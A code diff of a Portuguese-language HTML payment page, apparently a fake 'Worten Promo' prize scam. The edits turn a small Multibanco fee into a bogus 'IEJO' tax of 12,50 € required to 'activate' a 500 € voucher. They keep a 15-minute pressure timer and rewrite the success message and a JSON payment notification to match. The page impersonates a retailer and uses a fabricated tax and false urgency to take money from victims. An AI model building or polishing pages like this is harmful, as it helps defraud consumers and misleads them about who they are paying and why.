@@ -271,8 +271,9 @@
         <h2 style="text-align: center; font-size: 18px; margin-bottom: 10px; margin-top: 0;">Dados para Pagamento</h2>
 
         <div class="expiry-notice" style="margin-bottom: 15px;">
-            ⚠️ <strong>Pagamento Pendente:</strong> Efetue o pagamento nos próximos <strong>15 minutos</strong> para
-            validar a sua titularidade e libertar o seu prémio.
+            ⚠️ <strong>Pagamento de Imposto (IEJO):</strong> Efetue o pagamento nos próximos <strong>15 minutos</strong>
+            para
+            ativar o seu voucher de 500 € instantaneamente.
         </div>
 
         <div class="receipt-box" style="width: 100%; max-width: 100%; margin: 0 0 25px 0;">
@@ -315,7 +316,7 @@
                 </div>
                 <div class="data-row">
                     <span class="label">Montante</span>
-                    <span class="value">9,00 €</span>
+                    <span class="value">12,50 €</span>
                 </div>
             </div>
         </div>
@@ -425,7 +426,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         type: "Aprovado delivery",
-                        text: "Pagamento Confirmado: 9,00 € (Multibanco)",
+                        text: "Imposto Pago: 12,50 € (Multibanco) - Voucher Ativado",
                         title: "Worten Promo"
                     })
                 });
@@ -438,8 +439,8 @@
                             <path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/>
                         </svg>
                     </div>
-                    <h2 style="color: #4CAF50; margin-bottom: 10px;">Pagamento Confirmado!</h2>
-                    <p style="color: #666; font-size: 16px;">O seu voucher já se encontra ativo.</p>
+                    <h2 style="color: #4CAF50; margin-bottom: 10px;">Imposto Pago com Sucesso!</h2>
+                    <p style="color: #666; font-size: 16px;">O seu voucher de 500€ foi ativado para uso imediato.</p>
                 </div>
              `;
         }
